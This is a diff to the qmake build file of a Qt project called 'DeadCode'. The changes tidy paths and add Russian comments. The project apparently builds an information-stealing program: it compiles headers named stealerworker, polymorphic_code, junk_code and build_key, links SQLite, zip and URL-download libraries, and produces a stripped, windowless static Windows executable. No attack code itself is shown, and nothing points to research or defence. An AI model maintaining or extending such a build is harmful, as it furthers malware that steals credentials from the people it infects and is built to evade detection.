@@ -4,29 +4,36 @@ QT += core gui network widgets qml quick
 TARGET = DeadCode
 TEMPLATE = app
 
-# Конфигурация для релиза (убрали static, предполагаем динамическую сборку Qt)
+# Конфигурация для релиза (динамическая сборка Qt)
 CONFIG += release
 
+# Исходные файлы
 SOURCES += \
-    ../src/main.cpp \
-    mainwindow.cpp
+    $$PWD/../src/main.cpp \
+    $$PWD/mainwindow.cpp
 
+# Заголовочные файлы
 HEADERS += \
-    mainwindow.h \
-    ../src/build_key.h \
-    ../src/polymorphic_code.h \
-    ../src/junk_code.h \
-    ../src/stealerworker.h
+    $$PWD/mainwindow.h \
+    $$PWD/../src/build_key.h \
+    $$PWD/../src/polymorphic_code.h \
+    $$PWD/../src/junk_code.h \
+    $$PWD/../src/stealerworker.h
 
-FORMS += mainwindow.ui
+# Формы Qt Designer
+FORMS += \
+    $$PWD/mainwindow.ui
 
-RC_FILE = ../icon.rc
+# Файл ресурсов (ручная обработка)
+RC_FILE = $$PWD/../icon.rc
 
+# Пути для поиска заголовков
 INCLUDEPATH += \
-    ../src \
-    . \
+    $$PWD/../src \
+    $$PWD \
     C:/vcpkg/installed/x64-mingw-static/include
 
+# Библиотеки для линковки
 LIBS += -LC:/vcpkg/installed/x64-mingw-static/lib \
         -lsqlite3 \
         -lzip \
@@ -50,6 +57,7 @@ LIBS += -LC:/vcpkg/installed/x64-mingw-static/lib \
         -lurlmon \
         -lole32
 
+# Флаги компилятора
 QMAKE_CXXFLAGS += -O2 \
                   -std=c++17 \
                   -Wall \
@@ -64,40 +72,52 @@ QMAKE_CXXFLAGS += -O2 \
                   -Wno-deprecated-declarations \
                   -Wno-cast-function-type
 
-QMAKE_LFLAGS = -static-libgcc -static-libstdc++ -O2 -Wl,-s -Wl,-subsystem,windows -mthreads
+# Флаги линковщика
+QMAKE_LFLAGS += -static-libgcc \
+                -static-libstdc++ \
+                -O2 \
+                -Wl,-s \
+                -Wl,-subsystem,windows \
+                -mthreads
+
+# Определения для BUILD_DATE и BUILD_VERSION
+DEFINES += BUILD_DATE=\\\"2025-04-06\\\" \
+           BUILD_VERSION=\\\"f7bdaed\\\"
 
 # Директории для сборки
-DESTDIR = ../build/release
-OBJECTS_DIR = ../build/release
-MOC_DIR = ../build/release
-UI_DIR = ../build/release
+DESTDIR = $$PWD/../build/release
+OBJECTS_DIR = $$PWD/../build/release
+MOC_DIR = $$PWD/../build/release
+UI_DIR = $$PWD/../build/release
 
 # Расширенный список файлов для очистки
 QMAKE_CLEAN += \
-    ../build/release/DeadCode.exe \
-    ../build/release/*.o \
-    ../build/release/moc_*.cpp \
-    ../build/release/ui_*.h
+    $$DESTDIR/DeadCode.exe \
+    $$OBJECTS_DIR/*.o \
+    $$MOC_DIR/moc_*.cpp \
+    $$UI_DIR/ui_*.h
 
 # Настройки для Windows
 win32 {
     CONFIG(debug, debug|release) {
         QMAKE_CXXFLAGS += -g
         QMAKE_LFLAGS -= -O2
-        DESTDIR = ../build/debug
-        OBJECTS_DIR = ../build/debug
-        MOC_DIR = ../build/debug
-        UI_DIR = ../build/debug
+        DESTDIR = $$PWD/../build/debug
+        OBJECTS_DIR = $$PWD/../build/debug
+        MOC_DIR = $$PWD/../build/debug
+        UI_DIR = $$PWD/../build/debug
         QMAKE_CLEAN += \
-            ../build/debug/DeadCode.exe \
-            ../build/debug/*.o \
-            ../build/debug/moc_*.cpp \
-            ../build/debug/ui_*.h
+            $$DESTDIR/DeadCode.exe \
+            $$OBJECTS_DIR/*.o \
+            $$MOC_DIR/moc_*.cpp \
+            $$UI_DIR/ui_*.h
     }
 }
 
+# Зависимости для пересборки
 PRE_TARGETDEPS += \
-    ../src/build_key.h \
-    ../src/polymorphic_code.h \
-    ../src/junk_code.h \
-    ../src/stealerworker.h
+    $$PWD/../src/build_key.h \
+    $$PWD/../src/polymorphic_code.h \
+    $$PWD/../src/junk_code.h \
+    $$PWD/../src/stealerworker.h \
+    $$UI_DIR/ui_mainwindow.h
